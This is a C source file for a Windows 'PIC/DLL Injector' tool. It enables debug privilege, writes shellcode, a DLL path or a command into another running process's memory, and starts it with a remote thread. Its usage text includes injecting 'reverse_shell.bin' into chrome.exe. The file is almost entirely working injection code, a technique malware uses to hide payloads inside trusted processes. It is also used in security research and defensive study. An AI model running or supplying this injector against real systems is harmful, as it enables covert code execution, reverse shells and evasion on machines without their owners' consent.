/**
 *   PIC/DLL Injector v0.1
 *   Copyright (C) 2014, 2015 Odzhan
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#define _CRT_SECURE_NO_WARNINGS
#include "pi.h"

#if !defined (__GNUC__)
#pragma comment (lib, "advapi32.lib")
#pragma comment (lib, "dbghelp.lib")
#endif

// set width of console screen buffer
void setw (SHORT X) {
  CONSOLE_SCREEN_BUFFER_INFO csbi;
  
  GetConsoleScreenBufferInfo (GetStdHandle (STD_OUTPUT_HANDLE), &csbi);
  
  if (X <= csbi.dwSize.X) return;
  csbi.dwSize.X = X;
  SetConsoleScreenBufferSize (GetStdHandle (STD_OUTPUT_HANDLE), csbi.dwSize);
}

// allocate memory
void *xmalloc (SIZE_T dwSize) {
  return HeapAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
}

// free memory
void xfree (void *mem) {
  HeapFree (GetProcessHeap(), 0, mem);
}

// display error message for last error code
void xstrerror (char *fmt, ...) {
  char    *error=NULL;
  va_list arglist;
  char    buffer[1024];
  DWORD   dwError=GetLastError();
  
  va_start (arglist, fmt);
  vsnprintf (buffer, sizeof(buffer) - 1, fmt, arglist);
  va_end (arglist);
  
  if (FormatMessage (
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
        NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
        (LPSTR)&error, 0, NULL))
  {
    printf ("  [ %s : %s\n", buffer, error);
    LocalFree (error);
  } else {
    printf ("  [ %s error : %08lX\n", buffer, dwError);
  }
}

// convert process name to id
DWORD name2pid (char name[], int cpu_mode)
{
  HANDLE         hSnap, hProc;
  PROCESSENTRY32 pe32;
  DWORD          dwId=0;
  BOOL           bWow64;

  // get snapshot of all process running
  hSnap = CreateToolhelp32Snapshot (TH32CS_SNAPPROCESS, 0);
  
  if (hSnap != INVALID_HANDLE_VALUE) {
    pe32.dwSize = sizeof (PROCESSENTRY32);

    if (Process32First (hSnap, &pe32)) {
      do {
        // is this what we're looking for?
        if (!lstrcmpi (pe32.szExeFile, name)) 
        {
          if (cpu_mode!=0)
          {
            hProc=OpenProcess (PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
            if (hProc!=NULL) {
              bWow64=FALSE;
              IsWow64Process (hProc, &bWow64);
              CloseHandle (hProc);
              
              // if wow64 and excluding 32, continue
              if (bWow64 && cpu_mode==32) continue;
              // if wow64 and excluding 64, save it
              if (bWow64 && cpu_mode==64) continue;
              
              dwId = pe32.th32ProcessID;
              break;
            }
          } else {
            dwId = pe32.th32ProcessID;
            break;
          }
        }
      } while (Process32Next (hSnap, &pe32));
    }
    CloseHandle (hSnap);
  }
  return dwId;
}

// get domain and user id for process
BOOL proc2uid (HANDLE hProc, char domain[], 
  PDWORD domlen, char username[], PDWORD ulen) 
{
    HANDLE       hToken;
    SID_NAME_USE peUse;
    PTOKEN_USER  pUser;
    BOOL         bResult = FALSE;
    DWORD        dwTokenSize = 0, 
                 dwUserName = 64, 
                 dwDomain = 64;
    
    // try open security token
    if (!OpenProcessToken(hProc, TOKEN_QUERY, &hToken)) {
      return FALSE;
    }
    
    // try obtain user information size
    if (!GetTokenInformation (hToken, TokenUser, 
      0, 0, &dwTokenSize)) 
    {
      if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) 
      {
        pUser = xmalloc(dwTokenSize);
        if (pUser != NULL) 
        {
          if (GetTokenInformation (hToken, TokenUser, 
            pUser, dwTokenSize, &dwTokenSize)) 
          {
            bResult = LookupAccountSid (NULL, pUser->User.Sid, 
              username, ulen, domain, domlen, &peUse);
          }
          xfree (pUser);
        }
      }
    }
    CloseHandle (hToken);
    return bResult;
}

// list running process on system
DWORD pslist (int cpu_mode)
{
  HANDLE         hSnap, hProc;
  PROCESSENTRY32 pe32;
  DWORD          dwId = 0, ulen, dlen, mode=0;
  BOOL           bWow64;
  char           *cpu, *uid, *dom;
  char           domain[64], uname[64];

  hSnap = CreateToolhelp32Snapshot (TH32CS_SNAPPROCESS, 0);
  
  if (hSnap != INVALID_HANDLE_VALUE) 
  {
    pe32.dwSize = sizeof (PROCESSENTRY32);

    printf("\n%-35s  %-5s   %5s     %s", "Image Name", "PID", "CPU", "domain\\username");
    printf("\n===================================  =====     ======  ===============\n");
    
    if (Process32First (hSnap, &pe32)) 
    {
      do {
        cpu="??";
        uid="??";
        dom="??";
        // open process to determine CPU mode and user information
        hProc=OpenProcess (PROCESS_QUERY_INFORMATION, 
          FALSE, pe32.th32ProcessID);
          
        if (hProc!=NULL) {
          
          bWow64=FALSE;
          
          IsWow64Process (hProc, &bWow64);
          
          ulen=sizeof(uname);
          dlen=sizeof(domain);
          
          proc2uid (hProc, domain, &dlen, uname, &ulen);
          
          dom=domain;
          uid=uname;
          // i agree that the test probably fails for 32-bit systems
          // i'm running 64-bit windows
          cpu = (bWow64) ? "32" : "64";
          
          CloseHandle (hProc);
        }
        if (cpu_mode==32 && bWow64) continue;
        if (cpu_mode==64 && !bWow64) continue;
        
        printf ("%-35s  %-5lu  %5s-bit  %s\\%s\n", 
          pe32.szExeFile, pe32.th32ProcessID, 
          cpu, dom, uid);
          
      } while (Process32Next (hSnap, &pe32));
    }
    CloseHandle (hSnap);
  }
  return dwId;
}

#if !defined (__GNUC__)
/**
 *
 * Returns TRUE if process token is elevated
 *
 */
BOOL isElevated (VOID) {
  HANDLE          hToken;
  BOOL            bResult = FALSE;
  TOKEN_ELEVATION te;
  DWORD           dwSize;
    
  if (OpenProcessToken (GetCurrentProcess(), TOKEN_QUERY, &hToken)) 
  {
    if (GetTokenInformation (hToken, TokenElevation, &te,
        sizeof(TOKEN_ELEVATION), &dwSize)) 
    {
      bResult = te.TokenIsElevated != 0;
    }
    CloseHandle(hToken);
  }
  return bResult;
}
#endif

/**
*
* Enables or disables a named privilege in token
* Returns TRUE or FALSE
*
*/
BOOL set_priv (char szPrivilege[], BOOL bEnable) 
{
  HANDLE hToken;
  BOOL   bResult;
  
  bResult = OpenProcessToken(GetCurrentProcess(),
    TOKEN_ADJUST_PRIVILEGES, &hToken);
  
  if (bResult) {
    LUID luid;
    bResult = LookupPrivilegeValue(NULL, szPrivilege, &luid);
    if (bResult) {
      TOKEN_PRIVILEGES tp;
      
      tp.PrivilegeCount = 1;
      tp.Privileges[0].Luid = luid;
      tp.Privileges[0].Attributes = (bEnable) ? SE_PRIVILEGE_ENABLED : 0;

      bResult = AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    }
    CloseHandle(hToken);
  }
  return bResult;
}

LPVOID init_func (char *asmcode, DWORD len)
{
  LPVOID sc=NULL;
  
  // allocate write/executable memory for code
  sc = VirtualAlloc (0, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (sc!=NULL) {
    // copy code
    memcpy (sc, asmcode, len);
  } else {
    xstrerror ("VirtualAlloc()");
  }
  return sc;
}

void free_func (LPVOID func) {
  if (func!=NULL) {
    VirtualFree(func, 0, MEM_RELEASE);
  }
}

// runs position independent code in remote process
BOOL inject (DWORD dwId, LPVOID pPIC, 
  SIZE_T dwCode, LPVOID lpParam, SIZE_T dwParam, DWORD dbg)
{
  HANDLE                hProc, hThread;
  BOOL                  bStatus=FALSE, bRemoteWow64, bLocalWow64;
  LPVOID                pCode=NULL, pData=NULL;
  SIZE_T                written;
  DWORD                 old, idx, ec;
  pCreateRemoteThread64 CreateRemoteThread64=NULL;
  
  // try open the process
  printf("  [ opening process id %lu\n", dwId);
  hProc = OpenProcess (PROCESS_ALL_ACCESS, FALSE, dwId);
  if (hProc != NULL)
  {
    // allocate memory there
    printf("  [ allocating %lu bytes of RW memory in process for code\n", dwCode);
    pCode=VirtualAllocEx (hProc, 0, dwCode, MEM_COMMIT, PAGE_READWRITE);
    if (pCode != NULL)
    {
      // write the code
      printf("  [ writing %lu bytes of code to 0x%p\n", dwCode, pCode);
      bStatus=WriteProcessMemory (hProc, pCode, pPIC, dwCode, &written);
      if (bStatus) {
        printf("  [ changing memory attributes to RX\n");
        // change the protection to read/execute only
        VirtualProtectEx (hProc, pCode, dwCode, PAGE_EXECUTE_READ, &old);
        
        // is there a parameter required for PIC?
        if (lpParam != NULL) {
          printf("  [ allocating %lu bytes of RW memory in process for parameter\n", dwParam);
          pData=VirtualAllocEx (hProc, 0, dwParam+1, MEM_COMMIT, PAGE_READWRITE);
          if (pData != NULL)
          {
            printf("  [ writing %lu bytes of data to 0x%p\n", dwParam, pData);
            bStatus=WriteProcessMemory (hProc, pData, lpParam, dwParam, &written);
            if (!bStatus) {
              printf ("  [ warning: unable to allocate write parameters to process...");
            }
          }
        }
        
        IsWow64Process (GetCurrentProcess(), &bLocalWow64);
        IsWow64Process (hProc, &bRemoteWow64);
        
        printf("  [ remote process is %s-bit\n", bRemoteWow64 ? "32" : "64");
        if (dbg) {
          printf("  [ attach debugger now or set breakpoint on %p\n", pCode);
          printf("  [ press any key to continue . . .\n");
          fgetc (stdin);
        }
        printf("  [ creating thread\n");
        
        // if remote process is not wow64 but I am,
        // make switch to 64-bit for thread creation.
        if (!bRemoteWow64 && bLocalWow64) 
        {
          hThread=NULL;
          //DebugBreak ();
          CreateRemoteThread64=(pCreateRemoteThread64)
            init_func(CreateThreadPIC, CreateThreadPIC_SIZE);
            
          CreateRemoteThread64 (hProc, NULL, 0,
              (LPTHREAD_START_ROUTINE)pCode, pData, 0, 0, &hThread);
        } else {
          hThread=CreateRemoteThread (hProc, NULL, 0, 
              (LPTHREAD_START_ROUTINE)pCode, pData, 0, 0);
        }
        if (hThread != NULL)
        {
          printf ("  [ waiting for thread %lx to terminate\n", (DWORD)hThread);
          idx=WaitForSingleObject (hThread, INFINITE);
          if (idx!=0) {
            xstrerror ("WaitForSingleObject");
          }
          ec=0;
          if (GetExitCodeThread(hThread, &ec)) {
            printf ("  [ exit code was %lu (%08lX)", ec, ec);
          }
          CloseHandle (hThread);
        } else {
          xstrerror ("CreateRemoteThread");
        }
      }
      if (idx==0) {
        VirtualFreeEx (hProc, pCode, 0, MEM_RELEASE);
        if (pData!=NULL) {
          VirtualFreeEx (hProc, pData, 0, MEM_RELEASE);
        }
      }
    } else {
      xstrerror ("VirtualFreeEx()");
    }
    CloseHandle (hProc);
  } else {
    xstrerror ("OpenProcess (%lu)", dwId);
  }
  if (CreateRemoteThread64!=NULL) free_func(CreateRemoteThread64);
  return bStatus;
}

BOOL FileExists (LPCTSTR szPath)
{
  DWORD dwAttrib = GetFileAttributes(szPath);

  return (dwAttrib != INVALID_FILE_ATTRIBUTES && 
         !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

// read a PIC file from disk into memory
BOOL read_pic (char f[], LPVOID *code, SIZE_T *code_size) {
  LPVOID        pData;
  HANDLE        hFile;
  LARGE_INTEGER size;
  DWORD         read;
  BOOL          bStatus=FALSE;
  
  printf ("  [ opening %s\n", f);
  hFile=CreateFile (f, GENERIC_READ, FILE_SHARE_READ,
      0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
      
  if (hFile != INVALID_HANDLE_VALUE)
  {
    printf ("  [ getting size\n");
    GetFileSizeEx (hFile, &size);
    
    printf ("  [ allocating %lu bytes of memory for file\n", size.LowPart);
    pData=xmalloc(size.LowPart);
    if (pData != NULL)
    {
      printf ("  [ reading\n");
      bStatus=ReadFile (hFile, pData, size.LowPart, &read, 0);
      *code=pData;
      *code_size=read;
    } else {
      xstrerror("HeapAlloc()");
    }
    CloseHandle (hFile);
  } else {
    xstrerror ("CreateFile()");
  }
  return bStatus;
}

char* getparam (int argc, char *argv[], int *i)
{
  int n=*i;
  if (argv[n][2] != 0) {
    return &argv[n][2];
  }
  if ((n+1) < argc) {
    *i=n+1;
    return argv[n+1];
  }
  printf ("  [ %c%c requires parameter\n", argv[n][0], argv[n][1]);
  exit (0);
}

void usage (void)
{
  printf("\n  usage: pi [options] <proc name | proc id>\n\n");
  printf("       -d          Wait after memory allocation before running thread\n");
  printf("       -e <cmd>    Execute command in context of remote process (shows window)\n");
  printf("       -f <file>   Load a PIC file into remote process\n");
  printf("       -l <dll>    Load a DLL file into remote process\n");
  printf("       -p          List available processes on system\n");
  printf("       -x <cpu>    Exclude process running in cpu mode, 32 or 64\n\n");
  printf(" examples:\n\n");
  printf("    pi -e \"cmd /c echo this is a test > test.txt & notepad test.txt\" -x32 iexplore.exe\n");
  printf("    pi -l ws2_32.dll notepad.exe\n");
  printf("    pi -f reverse_shell.bin chrome.exe\n");
  exit (0);
}

int main (int argc, char *argv[])
{
  SIZE_T code_size=0;
  LPVOID code=NULL;
  DWORD  pid=0, cpu_mode=0;
  char   *proc=NULL, *pic=NULL; 
  char   *dll=NULL, *cmd=NULL;
  char   *cpu=NULL;
  int    i, plist=0, native=0, dbg=0;
  char   opt;
  
  setw (300);
  
  printf("\n  [ PIC/DLL injector v0.1");
  printf("\n  [ Copyright (c) 2014, 2015 Odzhan\n\n");
  
  for (i=1; i<argc; i++) {
    if (argv[i][0]=='/' || argv[i][0]=='-') {
      opt=argv[i][1];
      switch (opt) {
        // wait after memory allocation before running thread
        case 'd' :
          dbg=1;
          break;
        // Execute command in remote process
        case 'e' :
          cmd=getparam (argc, argv, &i);
          break;
        // Load PIC file into remote process
        case 'f' :
          pic=getparam (argc, argv, &i);
          break;
        // Load DLL into remote process
        case 'l' :
          dll=getparam (argc, argv, &i);
          break;
        // List running processes
        case 'p' :
          plist=1;
          break;
        // Return PID for cpu mode
        case 'x' :
          cpu=getparam (argc, argv, &i);
          break;
        case '?' :
        case 'h' :
        default  : { usage (); break; }
      }
    } else {
      // assume it's process name or id
      proc=argv[i];
    }
  }
#if !defined (__GNUC__)  
  // check if we're elevated token just incase target requires it
  if (!isElevated ()) {
    printf ("  [ warning: current process token isn't elevated\n");
  }
#endif

  // enable debug privilege in case remote process requires it
  if (!set_priv (SE_DEBUG_NAME, TRUE)) {
    printf ("  [ warning: unable to enable debug privilege\n");
  }

  if (cpu!=NULL) {
    cpu_mode=strtol (cpu, NULL, 10);
    if (cpu_mode!=32 && cpu_mode!=64) {
      printf ("  [ invalid cpu mode. 32 and 64 are valid");
      return 0;
    }
  }
  
  // list process?
  if (plist) {
    pslist(cpu_mode);
    return 0;
  }
  
  // no target process?
  if (proc==NULL) {
    printf ("  [ no target process specified\n");
    usage();
  }
  
  // try convert proc to integer
  pid=strtol (proc, NULL, 10);
  
  if (pid==0) {
    printf ("  [ searching %s-bit processes for %s\n", 
      cpu_mode==0 ? "32 and 64" : (cpu_mode==64 ? "32" : "64"), proc);
    // else get id from name
    pid=name2pid (proc, cpu_mode);
  }
  
  // no target action?
  if (cmd==NULL && dll==NULL && pic==NULL) {
    printf ("  [ no action specified for %s\n", proc);
    usage();
  }
  
  // have a pid?
  if (pid == 0)
  {
    printf ("  [ unable to obtain process id for %s\n", proc);
    return 0;
  }
  
  // is it ourselves?
  if (pid==GetCurrentProcessId()) {
    printf ("  [ cannot injekt self, bye\n");
  } else {
    // no, is this a PIC
    if (pic != NULL) {
      if (read_pic (pic, &code, &code_size)) {
        // injekt pic code without parameters
        inject (pid, code, code_size, NULL, 0, dbg);
        xfree (code);
      }
    } else 
    // is this DLL for LoadLibrary?
    if (dll != NULL) {
      inject (pid, LoadDLLPIC, LoadDLLPIC_SIZE, dll, lstrlen(dll), dbg);
    } else
    // is this command for WinExec?
    if (cmd != NULL) {
      inject (pid, ExecPIC, ExecPIC_SIZE, cmd, lstrlen(cmd), dbg);
    }
  }
  return 0;
}
